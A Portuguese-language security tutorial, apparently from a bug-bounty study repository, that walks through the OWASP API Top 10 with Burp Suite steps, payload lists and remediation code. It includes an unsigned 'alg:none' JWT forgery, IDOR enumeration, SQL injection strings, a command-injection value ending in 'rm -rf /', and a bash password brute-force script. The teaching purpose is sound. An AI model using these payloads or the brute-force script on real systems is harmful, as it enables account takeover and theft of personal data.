# 🚨 OWASP API TOP 10 - Exploração Completa com Burp Suite

Cada vulnerabilidade com: Explicação → Teste com Burp → Payloads → Case Study → Remediação

---

# 1️⃣ BOLA - Broken Object Level Authorization (IDOR em APIs)

## Vulnerabilidade

```
A API expõe objetos sem verificar se o usuário tem permissão:

GET /api/users/123/profile  → Retorna dados do usuário 123
GET /api/users/124/profile  → Você consegue ver dados de outro user!
GET /api/users/999/profile  → Dados do admin!

CVSS: 9.1 | Recompensa: $500-5K | Tempo: 30min-2h
```

## TESTE COM BURP SUITE - PASSO-A-PASSO

### PASSO 1: Interceptar Requisição Legítima

```
1. Proxy → Intercept is ON
2. Acesse seu perfil da API
3. Intercepte: GET /api/users/123/profile

Headers:
  Authorization: Bearer eyJhbGc...

Resposta:
  {
    "id": 123,
    "name": "Your Name",
    "email": "you@example.com",
    "role": "user"
  }

4. Send to Repeater
```

### PASSO 2: Enumerar IDs

```
No Repeater:

Teste 1: GET /api/users/124/profile
[Send] → Retorna dados de outro user = VULNERÁVEL!

Teste 2: GET /api/users/1/profile
[Send] → ID 1 geralmente é admin

Teste 3: GET /api/users/999/profile
[Send] → Não existe = erro 404

Teste 4: GET /api/users/admin/profile
[Send] → Usa username ao invés de ID
```

### PASSO 3: Usar Intruder para Enumerar

```
1. Send para Intruder
2. Positions: GET /api/users/§123§/profile
3. Payloads: 
   1
   2
   3
   ...
   100
   admin
   root
   administrator

4. Start Attack
5. Procure por:
   - Status 200 = sucesso
   - Tamanho de resposta diferente
   - Nomes de usuários revelados
```

### PASSO 4: Extrair Dados Sensíveis

```
Se conseguir acessar outros usuários:

GET /api/users/124/profile
GET /api/users/124/billing
GET /api/users/124/settings
GET /api/users/124/api-keys ← Pode ter chaves de API!
GET /api/users/124/tokens ← Pode ter tokens JWT!

Enumeração avançada:
GET /api/users/124/messages
GET /api/users/124/transactions
GET /api/users/124/documents
```

## PAYLOADS BOLA

```
Teste básico:
/api/users/123 → 124, 125, 999, 1, admin, root

Fuzzing numérico:
Intruder números: 1-1000

Fuzzing string:
admin, test, user, guest, root, nobody, me, self

UUID:
00000000-0000-0000-0000-000000000001
ffffffff-ffff-ffff-ffff-ffffffffffff

Padrões:
124, 0124, 00124 (leading zeros)
-1, -123 (números negativos)
123.0, 123.00 (floats)
```

## CASE STUDY: E-commerce API $50K

```
TIMELINE:

00:00 - Achado: GET /api/orders/123/details retorna pedido
       Cada pedido tem: ID, Itens, Preço, Status

00:15 - Testado: GET /api/orders/124/details → Retorna pedido de outro user!
        BOLA confirmado!

00:30 - Enumeração: 1000 pedidos testados
        Descobriu padrões de IDs

01:00 - Dados extraídos:
        - 5,000 pedidos
        - Endereços de entrega
        - Métodos de pagamento
        - Histórico completo

01:30 - Escalação:
        GET /api/admin/orders/report → Dashboard admin!
        Dados ainda mais sensíveis

02:00 - Documentado e enviado
        Recompensa: $50,000

IMPACTO:
- Qualquer user poderia ver qualquer pedido
- Dados PII expostos
- Possível alteração de pedidos (se PATCH/PUT vulnerável)
```

## REMEDIAÇÃO

**CÓDIGO VULNERÁVEL:**
```python
@app.get("/api/users/{user_id}/profile")
def get_user_profile(user_id: int):
    user = User.query.get(user_id)  # ❌ Sem verificação!
    return user
```

**CÓDIGO SEGURO:**
```python
@app.get("/api/users/{user_id}/profile")
@require_auth
def get_user_profile(user_id: int, current_user=None):
    # ✅ Verificar se é o próprio usuário
    if current_user.id != user_id:
        raise PermissionError("Acesso negado")
    
    user = User.query.get(user_id)
    return user
```

---

# 2️⃣ BROKEN AUTHENTICATION

## Vulnerabilidade

```
API autentica usuários incorretamente:
├── JWT sem assinatura
├── Credenciais em URL
├── Tokens nunca expiram
├── Session fixation
└── MFA fácil de bruteforcear

CVSS: 9.8 | Recompensa: $1K-10K | Tempo: 1-4h
```

## TESTE COM BURP: JWT SEM ASSINATURA

### PASSO 1: Interceptar Token JWT

```
GET /api/profile
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzLCJyb2xlIjoidXNlciJ9.xxx

1. Copie o token
2. Vá para Burp → Decoder
3. Base64 decode cada parte
```

### PASSO 2: Testar Algoritmo "none"

```
Header original:
{"alg":"HS256","typ":"JWT"}

Payload:
{"id":123,"role":"user"}

Modificar header:
{"alg":"none","typ":"JWT"}

Novo token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MTIzLCJyb2xlIjoiYWRtaW4ifQ.

Teste:
GET /api/admin
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MTIzLCJyb2xlIjoiYWRtaW4ifQ.

Se retorna dados admin = VULNERÁVEL!
```

## PAYLOADS AUTENTICAÇÃO

```
JWT sem assinatura:
{"alg":"none"}

JWT com secret fraco:
secret, password, 123456, key, admin

OAuth token com XSS:
?redirect_uri=javascript:alert('XSS')

Session fixation:
Set-Cookie: SESSIONID=attacker_value

Credentials em URL:
/api/login?username=admin&password=admin123
```

---

# 3️⃣ EXCESSIVE DATA EXPOSURE

## Vulnerabilidade

```
API retorna mais dados do que necessário:

GET /api/users/123/profile

Resposta vulnerável:
{
  "id": 123,
  "name": "User",
  "email": "user@example.com",
  "password_hash": "bcrypt...",  ← NÃO deveria retornar!
  "internal_id": "INT-001",      ← Campo interno!
  "api_key": "sk_live_xxx",      ← API Key exposta!
  "database_version": "5.7.2"    ← Info de sistema!
}

CVSS: 8.7 | Recompensa: $500-3K | Tempo: 1-2h
```

## TESTE COM BURP

### PASSO 1: Analisar Resposta Completa

```
1. Intercepte requisição de API
2. Envie para Repeater
3. Analise TODA a resposta JSON

Procure por:
- password, pwd, secret
- api_key, access_token
- internal_id, user_id_internal
- database_version, software_version
- role, permission, is_admin
- email, phone (dados privados)
- credit_card, ssn (PII)
```

### PASSO 2: Filtrar Dados

```
Verdadeiro:
GET /api/users/123 retorna:
{
  "id": 123,
  "name": "User",
  "email": "user@example.com"  ← Necessário
}

Vulnerável:
GET /api/users/123 retorna:
{
  "id": 123,
  "name": "User",
  "email": "user@example.com",
  "password_hash": "bcrypt...",  ← Não necessário!
  "api_key": "sk_xxx"            ← Não necessário!
}
```

---

# 4️⃣ LACK OF RESOURCES & RATE LIMITING

## Vulnerabilidade

```
API sem proteção contra:
├── Força bruta (sem limite de tentativas)
├── DoS (sem rate limit)
├── Abuse (sem throttling)
└── Resource exhaustion

CVSS: 7.5 | Recompensa: $200-2K | Tempo: 30min-1h
```

## TESTE COM BURP: BRUTEFORCEAR SENHA

### PASSO 1: Capturar Requisição de Login

```
POST /api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "test123"
}

Resposta:
- 200: {"token": "..."}
- 401: {"error": "Invalid credentials"}
```

### PASSO 2: Intruder - Força Bruta

```
1. Send para Intruder
2. Marque password: "test§123§"
3. Payloads:
   123456
   password
   admin
   letmein
   (top 1000 wordlist)

4. Start Attack
5. Procure por resposta diferente:
   - Status 200 = sucesso!
   - Token retornado = senha encontrada!
```

### PASSO 3: Script Automático

```bash
#!/bin/bash
# rate-limit-tester.sh

TARGET="https://api.example.com/auth/login"
WORDLIST="passwords.txt"

while read password; do
  RESPONSE=$(curl -s -X POST $TARGET \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$password\"}")
  
  if echo $RESPONSE | grep -q "token"; then
    echo "[+] SENHA ENCONTRADA: $password"
    break
  fi
done < $WORDLIST
```

---

# 5️⃣ BROKEN FUNCTION LEVEL AUTHORIZATION

## Vulnerabilidade

```
Usuário comum consegue acessar funções admin:

GET /api/users → Ver todos usuários (admin only)
DELETE /api/users/123 → Deletar usuários (admin only)
POST /api/admin/settings → Mudar configurações (admin only)

Sem verificar role/permissão!

CVSS: 8.8 | Recompensa: $1K-5K | Tempo: 1-3h
```

## TESTE COM BURP

```
1. Login como usuário normal
2. Capturar token
3. Testar endpoints admin:
   GET /api/admin
   GET /api/users (listar todos)
   DELETE /api/users/123
   POST /api/settings

4. Se aceita = VULNERÁVEL!
```

---

# 6️⃣ MASS ASSIGNMENT

## Vulnerabilidade

```
API aceita qualquer campo na requisição:

POST /api/users
{
  "name": "John",
  "email": "john@example.com",
  "role": "admin"  ← Campo que não deveria aceitar!
}

Usuário normal vira admin!

CVSS: 8.1 | Recompensa: $500-3K | Tempo: 1-2h
```

## TESTE COM BURP

```
1. Capture POST /api/profile/update
2. No Repeater, adicione campos extras:
   {
     "name": "Your Name",
     "email": "your@example.com",
     "role": "admin",
     "is_admin": true,
     "is_superuser": true,
     "privileges": "all"
   }

3. Se aceita alguns campos = Massa Assignment!
```

---

# 7️⃣ SECURITY MISCONFIGURATION

## Vulnerabilidade

```
API mal configurada:
├── Debug mode ativo (stack traces)
├── Documentação pública (Swagger)
├── Endpoints de teste em produção
├── CORS muito permissivo
├── Default credentials
└── Verbose error messages

CVSS: 7.5 | Recompensa: $200-2K | Tempo: 30min-1h
```

## TESTE COM BURP

```
Checklist:

☐ Procure por /swagger, /api-docs, /openapi.json
☐ Teste CORS: curl -H "Origin: http://attacker.com" endpoint
☐ Procure por debug=true em URLs
☐ Teste credenciais padrão (admin/admin)
☐ Teste endpoints de teste (/api/test, /api/dev)
☐ Procure por stack traces em erros
```

---

# 8️⃣ INJECTION - SQL, LDAP, Command em APIs

## Vulnerabilidade

```
API aceita entrada do usuário sem sanitizar:

GET /api/search?query=test' OR '1'='1
GET /api/users?filter=name[*]
GET /api/exec?cmd=whoami

CVSS: 9.8 | Recompensa: $1K-10K | Tempo: 1-4h
```

## TESTE COM BURP

### SQL Injection em API

```
GET /api/products?search=test

Payload 1:
/api/products?search=test' OR '1'='1--

Payload 2:
/api/products?search=test' UNION SELECT NULL,NULL--

Payload 3 (JSON):
{
  "search": "test' OR '1'='1"
}
```

### Command Injection em API

```
POST /api/convert
{
  "file": "document.pdf; rm -rf /"  ← Injection!
}
```

---

# 9️⃣ IMPROPER ASSETS MANAGEMENT

## Vulnerabilidade

```
Versões antigas/de teste expostas:
├── /api/v1 (versão antiga)
├── /api/v2 (versão atual)
├── /api/test (versão de teste)
├── /api/dev (desenvolvimento)
└── /api/internal (endpoint interno)

Versão velha pode ter vulnerabilidades!

CVSS: 6.5 | Recompensa: $100-1K | Tempo: 30min-1h
```

## TESTE

```
Enumerar versões:
GET /api/v1/users
GET /api/v2/users
GET /api/v3/users
GET /api/test/users
GET /api/dev/users

Se versão velha retorna dados = VULNERÁVEL!
```

---

# 🔟 INSUFFICIENT LOGGING & MONITORING

## Vulnerabilidade

```
API não loga:
├── Login falhos
├── Acessos não autorizados
├── Mudanças de dados
├── Erros críticos
└── Tentativas de exploração

Ataques vão despercebidos!

CVSS: 6.5 | Recompensa: $100-500 | Tempo: 30min-1h
```

---

## 📊 RESUMO - OWASP API TOP 10

| # | Tipo | CVSS | Recompensa | Tempo | Dificuldade |
|---|---|---|---|---|---|
| 1 | BOLA | 9.1 | $500-5K | 30min-2h | Fácil |
| 2 | Auth Failure | 9.8 | $1K-10K | 1-4h | Médio |
| 3 | Data Exposure | 8.7 | $500-3K | 1-2h | Fácil |
| 4 | Rate Limit | 7.5 | $200-2K | 30min-1h | Fácil |
| 5 | Func Auth | 8.8 | $1K-5K | 1-3h | Médio |
| 6 | Mass Assign | 8.1 | $500-3K | 1-2h | Médio |
| 7 | Misconfig | 7.5 | $200-2K | 30min-1h | Fácil |
| 8 | Injection | 9.8 | $1K-10K | 1-4h | Médio |
| 9 | Assets Mgmt | 6.5 | $100-1K | 30min-1h | Fácil |
| 10 | Logging | 6.5 | $100-500 | 30min-1h | Fácil |

---

**Próximo:** Volte para [API-SECURITY-MASTER-README.md](./API-SECURITY-MASTER-README.md)

